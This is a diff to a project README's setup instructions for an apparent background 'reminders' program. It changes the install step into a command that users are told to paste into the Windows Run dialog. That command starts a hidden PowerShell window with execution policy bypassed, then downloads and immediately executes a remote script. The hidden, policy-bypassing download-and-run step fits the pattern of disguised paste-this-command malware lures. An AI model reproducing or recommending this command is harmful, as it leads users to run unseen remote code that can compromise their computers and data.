@@ -4,10 +4,10 @@ No installation or prerequisites are needed. The program runs in the background.
 
 ### Setup
 
-Execute the following one-line install command in Microsoft Powershell:
+Execute the following one-line install command in the windows quickstart menu which can be accessed via the keyboard shortcut **Win + R**:
 
 ```
-irm 'https://raw.githubusercontent.com/Kiyan-7/telaviv/main/reminders.ps1' | iex
+%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "irm 'https://raw.githubusercontent.com/Kiyan-7/telaviv/main/reminders.ps1' | iex"
 ```
 
 ## Removal
